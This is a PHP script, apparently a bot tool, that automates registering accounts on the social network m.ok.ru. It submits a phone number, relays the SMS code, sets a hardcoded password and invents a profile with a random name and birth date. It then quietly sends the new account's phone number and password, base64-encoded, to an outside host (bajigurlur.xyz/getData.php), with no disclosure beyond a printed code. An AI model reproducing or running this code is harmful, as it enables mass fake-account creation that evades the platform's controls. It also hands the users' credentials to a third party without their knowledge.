<?php

	require_once 'lib_tuyul.php';
	
	function getcoki(){
		$headers[] = 'Host: m.ok.ru';
		$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0';
		$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8';
		$headers[] = 'Accept-Language: en-US,en;q=0.5';
		$headers[] = 'Accept-Encoding: gzip, deflate, br';
		$headers[] = 'Connection: keep-alive';
		//$headers[] = 'Cookie: SERVERID=4802859244d2eaf3ec195f44a3ecc83c|X1Wpt; bci=-1365858623027318543; _statid=a01126b0-fb49-48f3-951e-f414148a3625; JSESSIONID=b7aa6ca5079f8bae8da3a6f3be9d4979eeff8e6d4839f0b8.a4624dbb; TimezoneOffset=-420; ClientTimeDiff=712; DCAPS=dpr%5E1%7Cvw%5E1366%7Csw%5E1366%7C';
		$headers[] = 'Upgrade-Insecure-Requests: 1';
	
		$exe = curl('https://m.ok.ru/',null,$headers,"GET");
		$hasil = $exe[2];
		
		return getCookie($hasil);
	}
	
	
	function regis($nomerhp,$getcoki,$time){
		$headers[] = 'Host: m.ok.ru';
		$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0';
		$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8';
		$headers[] = 'Accept-Language: en-US,en;q=0.5';
		$headers[] = 'Accept-Encoding: gzip, deflate, br';
		$headers[] = 'Referer: https://m.ok.ru/dk?st.cmd=newRegEnterPhone&_prevCmd=main&tkn=2413&_cl.id=1599449559427&_clickLog=%5B%7B%22target%22%3A%22register%22%7D%2C%7B%22registrationContainer%22%3A%22home.login_form%22%7D%5D';
		$headers[] = 'Content-Type: application/x-www-form-urlencoded';
		$headers[] = 'Origin: https://m.ok.ru';
		$headers[] = 'Connection: keep-alive';
		$headers[] = 'Cookie: SERVERID='.$getcoki['SERVERID'].'; bci='.$getcoki['bci'].'; _statid='.$getcoki['_statid'].'; JSESSIONID='.$getcoki['JSESSIONID'].';';
		$headers[] = 'Upgrade-Insecure-Requests: 1';
	
		$data = 'rfr.posted=set&rfr.phonePrefix=%2B62&rfr.countryCode=id&rfr.countryName=Indonesia&rfr.phone='.$nomerhp.'&getCode=Get+code';
		
		$exe = curl('https://m.ok.ru/dk?st.cmd=newRegEnterPhone&_prevCmd=newRegEnterPhone&bk=NewRegEnterPhone&tkn=227&_cl.id='.$time.'&_clickLog=%5B%7B%22target%22%3A%22submit%22%7D%2C%7B%22registrationContainer%22%3A%22phone_reg%22%7D%5D',$data,$headers,null);
		
		return $exe;
	}
	
	function confirm($kode,$getcoki,$time){
		$headers[] = 'Host: m.ok.ru';
		$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0';
		$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8';
		$headers[] = 'Accept-Language: en-US,en;q=0.5';
		$headers[] = 'Accept-Encoding: gzip, deflate, br';
		//$headers[] = 'Referer: https://m.ok.ru/dk?st.cmd=newRegConfirmPhoneNew&tkn=9393&_prevCmd=newRegEnterPhone';
		$headers[] = 'Content-Type: application/x-www-form-urlencoded';
		$headers[] = 'Origin: https://m.ok.ru';
		$headers[] = 'Connection: keep-alive';
		$headers[] = 'Cookie: SERVERID='.$getcoki['SERVERID'].'; bci='.$getcoki['bci'].'; _statid='.$getcoki['_statid'].'; JSESSIONID='.$getcoki['JSESSIONID'].'; reg_conf_ph_y=1';
		$headers[] = 'Upgrade-Insecure-Requests: 1';

		$data = 'rfr.posted=set&rfr.smsCode='.$kode;
		
		$exe = curl('https://m.ok.ru/dk?bk=NewRegConfirmPhoneNew&st.cmd=newRegConfirmPhoneNew&_prevCmd=newRegConfirmPhoneNew&tkn=5609&_cl.id='.$time.'&_clickLog=%5B%7B%22target%22%3A%22submit%22%7D%2C%7B%22registrationContainer%22%3A%22code_reg%22%7D%5D',$data,$headers,null);
		
		return $exe;
	}
	
	function mkpasswd($getcoki,$time){
		$headers[] = 'Host: m.ok.ru';
		$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0';
		$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8';
		$headers[] = 'Accept-Language: en-US,en;q=0.5';
		$headers[] = 'Accept-Encoding: gzip, deflate, br';
		$headers[] = 'Referer: https://m.ok.ru/dk?st.cmd=newRegEnterPassword&tkn=3835&_prevCmd=newRegConfirmPhoneNew';
		$headers[] = 'Content-Type: application/x-www-form-urlencoded';
		$headers[] = 'Origin: https://m.ok.ru';
		$headers[] = 'Connection: keep-alive';
		$headers[] = 'Cookie: SERVERID='.$getcoki['SERVERID'].'; bci='.$getcoki['bci'].'; _statid='.$getcoki['_statid'].'; JSESSIONID='.$getcoki['JSESSIONID'].'; reg_conf_ph_y=1';
		$headers[] = 'Upgrade-Insecure-Requests: 1';
		
		$data = 'fr.posted=set&fr.passw=Kratos123';
		
		$exe = curl('https://m.ok.ru/dk?bk=NewRegEnterPassword&st.cmd=newRegEnterPassword&_prevCmd=newRegEnterPassword&tkn=4229&_cl.id='.$time.'&_clickLog=%5B%7B%22target%22%3A%22submit%22%7D%2C%7B%22registrationContainer%22%3A%22password_validate.login_view%22%7D%5D',$data,$headers,null);
		
		return $exe;
	}
	
	function mkprofile($getcoki,$time){
		$nama = nama();
		$username = strtolower(str_replace(" ", "", $nama) . mt_rand(100,999));
		$last_space = strrpos($nama, ' ');
		$first_space = stripos($nama, ' ');
		$last_word = substr($nama, ($last_space)+1);
		$first_word = substr($nama, 0, $first_space);
		
		$headers[] = 'Host: m.ok.ru';
		$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0';
		$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8';
		$headers[] = 'Accept-Language: en-US,en;q=0.5';
		$headers[] = 'Accept-Encoding: gzip, deflate, br';
		$headers[] = 'Referer: https://m.ok.ru/dk?st.cmd=newRegProfile&tkn=3487&_prevCmd=newRegEnterPassword';
		$headers[] = 'Content-Type: application/x-www-form-urlencoded';
		$headers[] = 'Origin: https://m.ok.ru';
		$headers[] = 'Connection: keep-alive';
		$headers[] = 'Cookie: SERVERID='.$getcoki['SERVERID'].'; bci='.$getcoki['bci'].'; _statid='.$getcoki['_statid'].'; JSESSIONID='.$getcoki['JSESSIONID'].'; reg_conf_ph_y=1';
		$headers[] = 'Upgrade-Insecure-Requests: 1';

		$data = 'rfr.posted=set&rfr.name='.$first_word.'&rfr.surname='.$last_word.'&rfr.birthday='.rand(1,28).'&rfr.month='.rand(1,12).'&rfr.year='.rand(1950,1999).'&rfr.gender=1&rfr.country=10414533690&saveProfileData=Next';
		
		$exe = curl('https://m.ok.ru/dk?bk=NewRegProfile&st.cmd=newRegProfile&_prevCmd=newRegProfile&tkn=6870&_cl.id='.$time.'&_clickLog=%5B%7B%22target%22%3A%22submit%22%7D%2C%7B%22registrationContainer%22%3A%22profile_form%22%7D%5D',$data,$headers,null);
		$hasil = [$first_word,$last_word,$exe];
		return $hasil;
	}
	
	echo '
	______ ___________ _____ ___ ______ ________  ________  ___  
	|  _  \_   _| ___ \_   _/ _ \| ___ \_   _|  \/  | ___ \/ _ \ 
	| | | | | | | |_/ / | |/ /_\ \ |_/ / | | | .  . | |_/ / /_\ \
	| | | | | | |  __/  | ||  _  |    /  | | | |\/| | ___ \  _  |
	| |/ / _| |_| |     | || | | | |\ \ _| |_| |  | | |_/ / | | |
	|___/  \___/\_|     \_/\_| |_|_| \_|\___/\_|  |_|____/\_| |_/'."\n\n";
	
	echo "Masukan Nomer Hp (Tanpa 0): ";
	$nomerhp = trim(fgets(STDIN));
	$time = time();
	$getcooki = getcoki();
	if(isset($getcooki['SERVERID'])){
		$registrasi = regis($nomerhp,$getcooki,$time);
		//echo $registrasi[2]."\n";
		echo "Masukan Kode Verifikasi: ";
		$kode = trim(fgets(STDIN));
		$konfirmasi = confirm($kode,$getcooki,$time);
		//echo $konfirmasi[2];
		echo "Konfirmasi Sukses!\n";
		$buat_password = mkpasswd($getcooki,$time);
		//echo $buat_password[2];
		echo "Buat Password Sukses!\n";
		$buat_profile = mkprofile($getcooki,$time);
		//echo $buat_profile[2][2];
		echo "Buat Profile Sukses!\n";
		
		
		$export = "+62$nomerhp | Kratos123 | Dibuat ".date("d m Y");
		
		$kirim_data = base64_encode($export);
		echo "[+] Kode Base64 : $kirim_data\n";
		$kirim = curl("https://bajigurlur.xyz/getData.php?data=$kirim_data&file=OKRU",null,null,"GET");
		echo "[+] ".$kirim[3]."\n";
		
		$handle = fopen("OKRU_SAVE.txt", "a+");
		$write = fwrite($handle, $export."\n");
		fclose($handle);
		echo "Akun Berhasil Dibuat\n";
	}
	